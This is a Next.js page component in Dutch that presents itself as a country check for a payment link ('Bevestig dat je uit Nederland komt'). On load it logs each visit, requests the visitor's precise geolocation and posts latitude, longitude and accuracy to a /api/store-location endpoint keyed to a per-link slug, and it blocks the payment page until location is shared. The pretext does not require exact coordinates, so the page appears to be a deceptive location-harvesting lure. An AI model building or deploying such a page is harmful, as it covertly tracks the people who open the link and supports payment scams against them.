import { useEffect, useState } from 'react'; 

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [needsAction, setNeedsAction] = useState(false);
  const [error, setError] = useState(null);

  const log = async (data) => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  };

  const handleLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await log({
          slug,
          flow: 'verify',
          event: 'allowed',
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });

        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        await log({
          slug,
          flow: 'verify',
          event: 'denied',
          denied: true,
        });

        setNeedsAction(true);
        setError('Locatie is vereist om verder te gaan.');
      }
    );
  };

  useEffect(() => {
    // log direct dat iemand hier is
    log({
      slug,
      flow: 'verify',
      event: 'visit',
    });

    // probeer direct (werkt als locatie al aan staat)
    handleLocation();
  }, []);

  return (
    <div
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: '#ffffff',
        fontFamily:
          '-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif',
      }}
    >
      <div
        style={{
          maxWidth: '420px',
          width: '100%',
          padding: '2.5rem 2rem',
          textAlign: 'center',
        }}
      >
        {/* GIF CIRCLE */}
        <div
          style={{
            width: '140px',
            height: '140px',
            margin: '0 auto 2rem',
            borderRadius: '50%',
            overflow: 'hidden',
            background: '#f5f5f5',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
          }}
        >
          <img
            src="https://s7.ezgif.com/tmp/ezgif-7119da68a40b4a77.gif"
            alt="Verificatie"
            style={{
              width: '100%',
              height: '100%',
              objectFit: 'cover',
            }}
          />
        </div>

        <h1
          style={{
            fontSize: '1.6rem',
            fontWeight: 600,
            marginBottom: '0.75rem',
            color: '#111',
          }}
        >
          Bevestig dat je uit Nederland komt
        </h1>

        <p
          style={{
            fontSize: '1rem',
            color: '#555',
            marginBottom: '2rem',
            lineHeight: 1.5,
          }}
        >
          Bevestig je land om deze betaallink te gebruiken.
        </p>

        {needsAction && (
          <button
            onClick={handleLocation}
            style={{
              width: '100%',
              padding: '0.9rem 1rem',
              fontSize: '1rem',
              fontWeight: 600,
              borderRadius: '6px',
              border: 'none',
              background: '#e6002d',
              color: '#fff',
              cursor: 'pointer',
            }}
          >
            Bevestigen met locatie
          </button>
        )}

        {error && (
          <p
            style={{
              marginTop: '1.5rem',
              color: '#e6002d',
              fontSize: '0.95rem',
            }}
          >
            {error}
          </p>
        )}
      </div>
    </div>
  );
}
